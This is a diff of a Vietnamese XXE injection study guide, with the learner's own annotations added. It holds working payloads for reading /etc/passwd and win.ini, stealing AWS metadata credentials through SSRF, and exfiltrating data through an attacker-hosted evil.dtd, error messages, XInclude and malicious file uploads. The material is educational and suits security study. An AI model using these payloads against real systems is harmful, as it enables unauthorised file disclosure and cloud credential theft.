@@ -1,4 +1,3 @@
-# XML External Entity (XXE) Injection - Sổ Tay Thực Chiến & Toàn Tập Kiến Thức
 
 > [!NOTE] Cốt lõi về XXE (Mental Model của mình)
 > **Bản chất của XXE là gì?** 
@@ -7,9 +6,7 @@
 
 ![Mô hình tổng quan kiến trúc XXE Injection](images/xxe-injection.svg)
 
----
-
-## 1. Roadmap Toàn Diện Về XXE
+## 1. Roadmap  Về XXE
 
 ```text
 XML External Entity (XXE) Injection
@@ -57,15 +54,13 @@ XML External Entity (XXE) Injection
     └── Code mẫu .NET (XmlReaderSettings)
 ```
 
----
-
 ## 2. Nền Tảng XML & DTD: "Hiểu Bản Chất Trước Khi Gõ Lệnh"
 
 Khi mới bắt đầu học Web Security, mình thường chỉ học vẹt payload `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`. Nhưng khi gặp các hệ thống thực tế hoặc WAF lọc từ khóa, nếu không hiểu sâu bản chất XML hoạt động thế nào thì rất dễ bế tắc. Dưới đây là cách mình hệ thống lại những khái niệm này một cách trực quan và dễ nhớ nhất.
 
 ### XML và Entity là cái gì?
 XML (Extensible Markup Language) là định dạng dữ liệu có cấu trúc thẻ.
-Trong XML, **XML Entity** giống hệt một **biến** trong ngôn ngữ lập trình. Khi mình định nghĩa một entity, mình có thể gọi lại nó nhiều lần ở bất cứ đâu trong thân file XML.
+Trong XML, ==🔴**XML Entity** giống hệt một **biến** trong ngôn ngữ lập trình.== ==Khi mình định nghĩa một entity, mình có thể gọi lại nó nhiều lần ở bất cứ đâu trong thân file XML.==
 
 Ví dụ thông thường:
 ```xml
@@ -81,12 +76,15 @@ Ví dụ thông thường:
 ```
 
 ### DTD (Document Type Definition) là gì?
-DTD là bản thiết kế quy định ngữ pháp cho tài liệu XML (gồm các thẻ nào, kiểu dữ liệu gì, và có những thực thể nào được khai báo). DTD có thể:
+==🔴DTD== là bản thiết kế quy định ngữ pháp cho tài liệu XML (gồm các thẻ nào, kiểu dữ liệu gì, và có những thực thể nào được khai báo). DTD có thể:
 1. Được viết trực tiếp bên trong file XML (**Internal DTD**) thông qua `<!DOCTYPE root_element [...]>`.
-2. Hoặc được tải từ bên ngoài (**External DTD**) thông qua `SYSTEM "http://..."` hoặc `SYSTEM "file://..."`.
+2. Hoặc được ==tải từ bên ngoài== (**External DTD**) thông qua `SYSTEM "http://..."` hoặc `SYSTEM "file://..."`.
+
+> [!NOTE]
+> extenal enity được khai báo trong DTD
 
 ### External Entity (Thực thể ngoài) - Nguồn gốc sinh ra lỗ hổng
-Thay vì gán cứng giá trị cho Entity là chuỗi chữ bình thường, chuẩn XML cho phép dùng từ khóa `SYSTEM` kèm theo một đường dẫn URI để nạp nội dung từ bên ngoài:
+Thay vì gán cứng giá trị cho Entity là chuỗi chữ bình thường, ==chuẩn XML cho phép dùng từ khóa `SYSTEM` kèm theo một đường dẫn URI để nạp nội dung từ bên ngoài:==
 
 ```xml
 <!ENTITY myExternalVariable SYSTEM "file:///etc/passwd">
@@ -95,6 +93,9 @@ Hoặc:
 ```xml
 <!ENTITY myNetworkData SYSTEM "http://internal.service/secret.json">
 ```
+
+> [!NOTE]
+> Để ý cái SYSTEM ở đây, nó dùng để khai báo DTD từ url bên ngoài, đồng thời nó cũng dùng để khai báo cho 1 ENITY ở bên ngoài (url)
 
 Khi ứng dụng parse file XML này và gặp thẻ gọi `&myExternalVariable;`, bộ parser ngây thơ sẽ **tự động đọc file `/etc/passwd` trên ổ đĩa** hoặc **gửi request HTTP đến server nội bộ** rồi nhét nội dung đó vào XML tree!
 
@@ -106,14 +107,15 @@ flowchart TD
     Parser -- 4. Nhúng nội dung vào XML response --> Attacker
 ```
 
----
+> [!question]
+> ? attacker chèn cái XML kiểu gì 
 
 ## 3. Khai Thác XXE Trực Tiếp: Đọc File Cục Bộ (In-Band File Retrieval)
 
 Đây là kịch bản thuận lợi nhất mà mình hay gặp trong các bài lab PortSwigger và các ứng dụng doanh nghiệp: **Dữ liệu phân giải từ thẻ XML được server in thẳng ra màn hình**.
 
-![Mô hình khai thác In-Band XXE đọc file hệ thống](images/xxe-file-retrieval.svg)
-
+![Mô hình khai thác In-Band XXE đọc file hệ thống|700](images/xxe-file-retrieval.svg)
+-> nhìn ví dụ này để hiểu hơn cách mà aatacker có thể chèn xml enity qua trường input, thứ mà sẽ được dùng để làm đầu vào cho truy vấn 
 ### Kịch bản thực tế: Check tồn kho (Check Stock)
 Giả sử mình bắt được một request kiểm tra hàng tồn kho gửi lên bằng XML qua Burp Suite:
 
@@ -154,6 +156,10 @@ Content-Length: 198
     <storeId>1</storeId>
 </stockCheck>
 ```
+-> chinhr sửa luôn khối request
+
+> [!question]
+> câu hỏi là nếu cái request này có csrf token,thì xử lý ra sao 
 
 Nếu server chưa tắt external entities, parser sẽ đọc toàn bộ nội dung file `/etc/passwd` thay vào vị trí `<productId>` và phản hồi:
 ```http
@@ -170,14 +176,13 @@ ti:x:1000:1000:ti:/home/ti:/bin/bash
 > Nếu mục tiêu chạy Windows (IIS, .NET), mình sẽ đổi đường dẫn sang:
 > `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` hoặc `file:///C:/boot.ini`.
 
----
 
 ## 4. Khai Thác XXE Để Thực Hiện SSRF (Server-Side Request Forgery)
 
 Nếu target chạy trên hạ tầng Cloud (AWS, Azure, GCP) hoặc nằm sau mạng riêng nội bộ, mình luôn ưu tiên biến XXE thành SSRF để nâng mức độ nghiêm trọng của bug lên Critical.
 
-![Mô hình khai thác SSRF qua XXE chọc vào Cloud Metadata](images/xxe-ssrf-metadata.svg)
-
+![Mô hình khai thác SSRF qua XXE chọc vào Cloud Metadata|700](images/xxe-ssrf-metadata.svg)
+ -->lần này SYSTEM thay vì trỏ tới file nội bộ, thì nó sẽ trỏ tới 1 url nội bộ, để có thể ssrf truy vấn tới các internal system phía sever
 ### Payload khai thác AWS EC2 Metadata:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -203,8 +208,6 @@ Khi server phản hồi, mình nhận ngay bộ Secret Access Key và Token củ
 ```
 Từ đây bug nhảy từ Medium/High lên thẳng **Critical ($10,000+)** vì mình có thể chiếm toàn quyền kiểm soát tài khoản Cloud của công ty mục tiêu!
 
----
-
 ## 5. Blind XXE: "Khi Server Không Trả Về Kết Quả, Mình Làm Gì?"
 
 Trong thực tế đi pentest và săn bug bounty, hơn 80% trường hợp ứng dụng parse XML nhưng **không hề in giá trị của thẻ ra màn hình** (hoặc chỉ trả về `{"status": "success"}`). Đây gọi là **Blind XXE**.
@@ -213,6 +216,9 @@ Trong thực tế đi pentest và săn bug bounty, hơn 80% trường hợp ứn
 1. **Dò tìm OOB (Out-Of-Band)**: Xác nhận parser có chịu gọi ra ngoài không.
 2. **Rút trích dữ liệu qua External DTD**: Dùng tham số `%` (Parameter Entity) để kéo file gửi về server của mình.
 3. **Khai thác qua Error Message (Error-based)**: Cố ý ném lỗi để server in nội dung file vào log / stack trace.
+
+> [!NOTE]
+> thực ra cách check nó cũng ko khác gì blind ssrf và blind sql cho lắm 
 
 ### 5.1. Dò tìm Blind XXE bằng Burp Collaborator
 Đầu tiên, mình test xem parser có gửi HTTP hoặc DNS lookup ra ngoài không:
@@ -238,13 +244,11 @@ Trong thực tế đi pentest và săn bug bounty, hơn 80% trường hợp ứn
 > ```
 > Khi thấy DNS hoặc HTTP interaction báo về trên Burp Collaborator, mình chắc chắn 100% mục tiêu dính Blind XXE!
 
----
-
 ### 5.2. Rút trích dữ liệu ra ngoài (Data Exfiltration via OOB)
 
 Đây là kỹ thuật tinh tế nhất. Do chuẩn XML cấm gọi Parameter Entity lồng nhau ngay trong Internal DTD, mình phải host một file DTD độc hại trên server của mình (**External DTD**).
 
-![Mô hình Blind XXE rút trích dữ liệu qua External DTD](images/blind-xxe-oob-dtd.svg)
+![Mô hình Blind XXE rút trích dữ liệu qua External DTD|700](images/blind-xxe-oob-dtd.svg)
 
 #### Bước 1: Host file `evil.dtd` trên máy chủ hoặc Burp Collaborator:
 ```xml
@@ -270,8 +274,6 @@ Trong thực tế đi pentest và săn bug bounty, hơn 80% trường hợp ứn
 
 Ngay lập tức, server mục tiêu sẽ tải `evil.dtd`, thực thi logic, và gửi nội dung `/etc/hostname` thẳng vào log HTTP của mình!
 
----
-
 ### 5.3. Rút trích dữ liệu qua Error Message (Error-based XXE)
 
 Nếu server mục tiêu nằm sau một Firewall cực gắt **chặn mọi kết nối đi ra ngoài (Egress Filtering)**, phương án OOB Collaborator sẽ tịt ngòi. 
@@ -291,8 +293,6 @@ Khi server thực thi, nó sẽ cố mở file `/khong_co_file_nay/<nội_dung_e
 java.io.FileNotFoundException: /khong_co_file_nay/root:x:0:0:root:/root:/bin/bash... (No such file or directory)
 ```
 Nội dung file bí mật lập tức bị phun ra trong stack trace hiển thị trên màn hình!
-
----
 
 ### 5.4. Đỉnh cao: Repurposing a Local DTD (Khi server bị chặn 100% kết nối mạng ra ngoài)
 
@@ -328,17 +328,15 @@ Ví dụ trên các bản phân phối Linux thường có file `/usr/share/yelp
 
 **Kết quả:** Parser đọc file local DTD có sẵn trên ổ đĩa, nạp entity bị ghi đè, cố gắng đọc đường dẫn file lỗi và nhả toàn bộ `/etc/passwd` ra thông báo lỗi HTTP 500! Hoàn toàn 0-byte network egress!
 
----
-
 ## 6. Bề Mặt Tấn Công Ẩn (Hidden Attack Surface)
 
 Rất nhiều bạn hỏi mình: *"Website mình test toàn gửi JSON hoặc Form dữ liệu, làm gì có thẻ `<?xml` nào mà test XXE?"*. 
 Đừng để bề nổi đánh lừa! Dưới đây là 3 kỹ thuật mình luôn kiểm tra khi không thấy XML hiển thị lộ liễu:
 
-![3 Bề mặt tấn công XXE tiềm ẩn](images/xxe-hidden-surface.svg)
+![3 Bề mặt tấn công XXE tiềm ẩn|700](images/xxe-hidden-surface.svg)
 
 ### 6.1. XInclude Attacks: Khi chỉ kiểm soát một phần XML
-Trong các kiến trúc backend dùng SOAP hoặc microservices, frontend chỉ nhận tham số của bạn (ví dụ `productId=123`) rồi tự ráp vào một XML template có sẵn:
+Trong các kiến trúc backend dùng SOAP hoặc microservices, ==🟡frontend chỉ nhận tham số của bạn (ví dụ `productId=123`) rồi tự ráp vào một XML template có sẵn:==
 
 ```xml
 <!-- Backend template mà bạn KHÔNG nhìn thấy -->
@@ -360,8 +358,64 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="tex
 ```
 
 Nếu parser hỗ trợ XInclude, nó sẽ tự đọc `/etc/passwd` và nhét thẳng vào vị trí thẻ `<foo>`!
-
----
+> [!NOTE]
+> ### 1. Bối cảnh: Bạn bị "bịt mắt" một nửa
+> 
+> Hãy tưởng tượng Server có một tờ đơn (XML template) được in sẵn như thế này:
+> 
+> > **[Tên khách hàng]**: 1.2.3.4  
+> > **[Mã sản phẩm]**: ............................ _(Chỗ trống để bạn điền)_
+> 
+> Bạn không được phép sửa phần đầu của tờ đơn (không thể thêm `<!DOCTYPE>` - vốn là câu lệnh ma thuật để khai báo XXE thông thường). Bạn **chỉ được phép điền chữ vào ô "Mã sản phẩm"**.
+> 
+> ### 2. Kỹ thuật XInclude là gì?
+> 
+> Vì không thể xài `<!DOCTYPE>` ở đầu, Hacker dùng một "tuyệt chiêu" khác của XML gọi là **XInclude** (viết tắt của XML Include).  
+> Nó giống như việc bạn điền vào ô trống dòng chữ: _"Này Server, hãy đi mở cái file `/etc/passwd` trong máy ông ra, copy toàn bộ nội dung dán vào ngay chỗ tôi đang ghi nhé!"_.
+> 
+> ### 3. Mổ xẻ Payload
+> 
+> Bạn nhìn vào cái `productId` bạn gửi lên:  
+> `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
+> 
+> - `<foo ...>`: Chỉ là một cái thẻ vỏ bọc rỗng, tên gì cũng được (foo, bar, abc...).
+>     
+> - `xmlns:xi="http://www.w3.org/2001/XInclude"`: Đây là câu thần chú báo cho Server biết: _"Ê, tôi đang dùng chiêu XInclude đấy nhé!"_.
+>     
+> - `<xi:include parse="text" href="file:///etc/passwd"/>`: Đây là câu lệnh thực thi.
+>     
+>     - `href="file:///etc/passwd"`: Đường dẫn tới file bí mật của hệ điều hành Linux (chứa thông tin user, password).
+>         
+>     - `parse="text"`: Bảo server đọc file đó dưới dạng văn bản bình thường và nhét thẳng vào.
+>         
+> 
+> ### 4. Chuyện gì xảy ra ở phía Server?
+> 
+> Khi Server nhận được đoạn mã trên, nó sẽ ráp vào tờ đơn của nó:
+> 
+> 
+> ```xml
+> 
+> <backendRequest>
+>   <clientIp>1.2.3.4</clientIp>
+>   <productId>
+>      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+>         <xi:include parse="text" href="file:///etc/passwd"/>
+>      </foo>
+>   </productId>
+> </backendRequest>
+> ```
+> 
+> Nếu Server dùng một bộ đọc XML (parser) bị lỗi và hỗ trợ XInclude, nó sẽ tự động đi đọc file `/etc/passwd`, nhét nội dung file đó vào vị trí thẻ `<foo>`.
+> 
+> Kết quả là cái Response trả về cho bạn thay vì chỉ là `"Đã thêm sản phẩm"`, nó sẽ in ra toàn bộ nội dung file `/etc/passwd`!
+> 
+> 
+> **Tóm lại:**
+> 
+> - **XXE truyền thống:** Cần chèn `<!DOCTYPE>` ở đầu tài liệu.
+>     
+> - **XInclude Attack:** Dùng khi bạn bị kẹt ở giữa (thân) tài liệu XML. Bạn dùng "chiêu" XInclude để bảo Server tự động nhúng nội dung file bí mật vào ngay tại vị trí bạn kiểm soát.
 
 ### 6.2. XXE Qua File Upload: SVG và Microsoft Office (DOCX, XLSX)
 Bất cứ tính năng upload avatar, logo, import file Excel hay xử lý hóa đơn nào cũng đều là "mỏ vàng" XXE tiềm năng.
@@ -384,8 +438,6 @@ Các file Office hiện đại (OpenXML) thực chất là file nén ZIP chứa 
 2. Giải nén, mở file `word/document.xml` hoặc `[Content_Types].xml`.
 3. Nhét payload DOCTYPE XXE vào đầu file XML đó.
 4. Nén lại thành `.zip`, đổi đuôi thành `.docx` và upload lên server.
-
----
 
 ### 6.3. Thay Đổi Content-Type (Content-Type Swapping)
 Nhiều framework backend (như Spring Boot, ASP.NET, PHP API) có cơ chế **tự động parse theo `Content-Type`**. Dù ban đầu giao diện gửi JSON:
